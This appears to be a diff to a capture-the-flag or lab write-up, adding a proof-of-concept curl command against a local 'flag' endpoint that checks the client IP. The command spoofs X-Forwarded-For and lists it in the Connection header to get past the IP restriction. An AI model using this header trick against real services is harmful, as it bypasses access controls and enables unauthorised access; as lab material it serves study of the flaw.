@@ -38,3 +38,8 @@ def flag():
     else:
         return 'IP From %s is forbidden' % src_ip
 ```
+
+### POC
+``` bash
+curl "http://127.0.0.1:8089/flag" -H "X-Forwarded-For: 127.0.0.1" -H "Connection: X-Forwarded-For"
+```
